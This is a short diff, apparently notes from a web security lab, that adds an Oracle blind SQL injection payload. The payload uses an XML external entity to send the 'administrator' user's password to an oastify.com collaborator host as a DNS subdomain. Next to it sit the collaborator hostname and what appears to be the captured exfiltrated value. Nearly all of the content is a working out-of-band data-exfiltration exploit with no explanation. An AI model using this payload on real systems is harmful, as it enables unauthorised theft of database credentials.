@@ -1,0 +1,7 @@
+
+wvvc5hew4tc1dgnd4qo5d2c2mtskga4z.oastify.com
+
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.wvvc5hew4tc1dgnd4qo5d2c2mtskga4z.oastify.com"> %remote;]>'),'/l') FROM dual)-- 
+
+l3sjtrl5m6jqjph9b5yi.wvvc5hew4tc1dgnd4qo5d2c2mtskga4z.oastify.com
